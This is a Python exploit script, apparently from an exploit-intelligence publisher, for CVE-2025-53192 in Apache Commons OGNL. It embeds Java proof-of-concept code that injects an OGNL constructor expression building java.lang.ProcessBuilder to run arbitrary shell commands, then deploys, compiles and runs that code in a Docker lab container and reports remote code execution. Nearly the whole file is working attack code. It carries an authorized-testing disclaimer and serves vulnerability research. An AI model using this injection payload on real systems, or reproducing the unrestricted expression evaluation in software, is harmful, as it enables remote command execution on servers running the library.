#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Commons OGNL — Expression Injection to RCE (ProcessBuilder)
# CVE            : CVE-2025-53192
# Vendor         : Apache Software Foundation
# Product        : Apache Commons OGNL
# Affected       : All versions (project retired, no fix)
# Type           : CWE-146 - Expression/Command Delimiter Injection
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-53192 — Vector 2: ProcessBuilder Constructor Chain

Exploits (new java.lang.ProcessBuilder(...)).start() via the ASTCtor AST node.
Uses a DIFFERENT code path than Vector 1 (ASTStaticMethod).

ATTACK CHAIN:
  1. ASTCtor → OgnlRuntime.callConstructor()
  2. DefaultClassResolver → ClassLoader.loadClass("java.lang.ProcessBuilder") (NO CHECK)
  3. Constructor.newInstance() → ProcessBuilder created
  4. ASTMethod: .start() → Process launched → RCE

PREREQUISITES:
  - Python 3 (stdlib only)
  - Docker container 'cve-2025-53192-vulnerable' running

REFERENCES:
  - CVE-2025-53192
  - https://github.com/advisories/GHSA-5vgh-76mj-8hcq
"""

import subprocess
import sys
import textwrap

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

DEFAULT_CONTAINER = "cve-2025-53192-vulnerable"
CLASSPATH = "/lab:/lab/commons-ognl.jar:/lab/javassist.jar"

JAVA_POC_SOURCE = textwrap.dedent(r'''
    import org.apache.commons.ognl.Ognl;
    import org.apache.commons.ognl.OgnlContext;
    import org.apache.commons.ognl.DefaultClassResolver;
    import org.apache.commons.ognl.DefaultTypeConverter;
    import org.apache.commons.ognl.DefaultMemberAccess;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;

    /**
     * CVE-2025-53192 Vector 2 — ProcessBuilder constructor chain
     *
     * This vector uses OGNL's constructor invocation (ASTCtor) instead of
     * static method calls (ASTStaticMethod). It demonstrates that class
     * instantiation is equally unrestricted.
     *
     * Code path:
     *   ASTCtor.getValueBody() [line 75-138]
     *   → OgnlRuntime.callConstructor("java.lang.ProcessBuilder", args)
     *   → OgnlRuntime.classForName("java.lang.ProcessBuilder")
     *   → DefaultClassResolver.classForName() → loadClass() ← NO RESTRICTION
     *   → Constructor.newInstance() → ProcessBuilder created
     *   ASTMethod.getValueBody()
     *   → .start() → process launched
     */
    public class PoCVector2 {
        public static void main(String[] args) throws Exception {
            // Create OgnlContext with unrestricted defaults
            DefaultMemberAccess memberAccess = new DefaultMemberAccess(false);
            OgnlContext context = new OgnlContext(
                new DefaultClassResolver(),
                new DefaultTypeConverter(),
                memberAccess
            );
            context.setRoot(new Object());

            String command = args.length > 0 ? args[0] : "whoami";

            // OGNL expression using constructor syntax (ASTCtor code path)
            String expr = "(new java.lang.ProcessBuilder(new java.lang.String[]{\"sh\",\"-c\",\"" + command + "\"})).start()";
            System.out.println("VECTOR: ProcessBuilder Constructor Chain (ASTCtor)");
            System.out.println("OGNL_EXPR: " + expr);

            // Parse and evaluate — triggers ASTCtor → callConstructor()
            Object tree = Ognl.parseExpression(expr);
            Object result = Ognl.getValue(tree, context, context.getRoot());

            // Read output
            Process proc = (Process) result;
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            proc.waitFor();

            System.out.println("CMD_OUTPUT_START");
            System.out.print(output.toString());
            System.out.println("CMD_OUTPUT_END");
            System.out.println("STATUS: SUCCESS");
        }
    }
''').strip()


def run_docker_exec(container, cmd, timeout=30):
    full_cmd = ["docker", "exec", container] + cmd
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def copy_to_container(container, content, dest_path):
    full_cmd = ["docker", "exec", "-i", container, "sh", "-c", f"cat > {dest_path}"]
    try:
        result = subprocess.run(full_cmd, input=content, capture_output=True, text=True, timeout=10)
        return result.returncode == 0
    except Exception:
        return False


def exploit(container, command="whoami"):
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}  CVE-2025-53192 Vector 2: ProcessBuilder Constructor Chain{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print()
    print(f"  {YELLOW}Code path:{RESET} ASTCtor → OgnlRuntime.callConstructor() → DefaultClassResolver")
    print(f"  {YELLOW}Contrast:{RESET}  Vector 1 uses ASTStaticMethod; this uses ASTCtor (different AST node)")
    print()

    # Deploy, compile, run
    print(f"  [1/3] Deploying exploit...", end=" ")
    if not copy_to_container(container, JAVA_POC_SOURCE, "/lab/PoCVector2.java"):
        print(f"{RED}FAILED{RESET}")
        return False
    print(f"{GREEN}OK{RESET}")

    print(f"  [2/3] Compiling...", end=" ")
    rc, _, stderr = run_docker_exec(container, ["javac", "-cp", CLASSPATH, "/lab/PoCVector2.java"])
    if rc != 0:
        print(f"{RED}FAILED{RESET}\n  {stderr}")
        return False
    print(f"{GREEN}OK{RESET}")

    print(f"  [3/3] Executing OGNL constructor injection...", end=" ")
    rc, stdout, stderr = run_docker_exec(container, ["java", "-cp", CLASSPATH, "PoCVector2", command])

    # Parse output
    cmd_output = ""
    in_output = False
    for line in stdout.splitlines():
        if line.strip() == "CMD_OUTPUT_START":
            in_output = True
            continue
        if line.strip() == "CMD_OUTPUT_END":
            in_output = False
            continue
        if in_output:
            cmd_output += line + "\n"

    if "STATUS: SUCCESS" in stdout and cmd_output.strip():
        print(f"{GREEN}OK{RESET}")
        print()
        for line in stdout.splitlines():
            if line.startswith("OGNL_EXPR:"):
                print(f"  {YELLOW}Expression:{RESET} {line[len('OGNL_EXPR:'):].strip()}")
        print(f"  {GREEN}[EXPLOIT SUCCEEDED]{RESET} → {RED}{cmd_output.strip()}{RESET}")
        print(f"\n  {GREEN}✓ RCE via ProcessBuilder constructor chain confirmed{RESET}")
        return True
    else:
        print(f"{RED}FAILED{RESET}")
        print(f"  stdout: {stdout}")
        return False


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    success = exploit(container, command)
    sys.exit(0 if success else 1)
